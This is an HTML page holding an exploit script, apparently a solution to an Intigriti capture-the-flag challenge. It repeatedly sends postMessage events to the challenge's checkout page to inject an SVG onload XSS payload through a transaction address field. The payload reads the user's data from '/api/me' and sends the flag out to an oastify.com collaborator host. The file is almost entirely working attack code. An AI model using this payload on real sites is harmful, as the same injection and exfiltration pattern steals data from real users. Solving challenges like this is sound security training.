<!DOCTYPE html>
<html>
<body>
<script>
    // The target with the Admin's currency
    const target = 'https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1';
    const collab = 'https://b4gofscv4huzfnm16g1zxfipfgl79zxo.oastify.com';
    
    // The XSS payload: No spaces, no quotes, maximum speed.
    const xss = `"><svg/onload=fetch('/api/me').then(r=>r.json()).then(d=>fetch('${collab}/?f='+d.flag))> `;

    // Open the target
    const win = window.open(target);

    // Instead of a long timeout, we spam the postMessage as fast as the CPU allows
    // This ensures we hit the 'init' state of the checkout page immediately.
    const heist = setInterval(() => {
        if (win) {
            win.postMessage({
                type: 'submitTransaction',
                transaction: {
                    toAddress: xss,
                    currency: '1337COIN',
                    amount: 0.00000001
                }
            }, '*');
        }
    }, 100);

    // Redirect the top window to the trigger page after 5 seconds
    setTimeout(() => {
        clearInterval(heist);
        window.location.href = 'https://challenge-0126.intigriti.io/marketwatch.html';
    }, 5000);
</script>
</body>
</html>
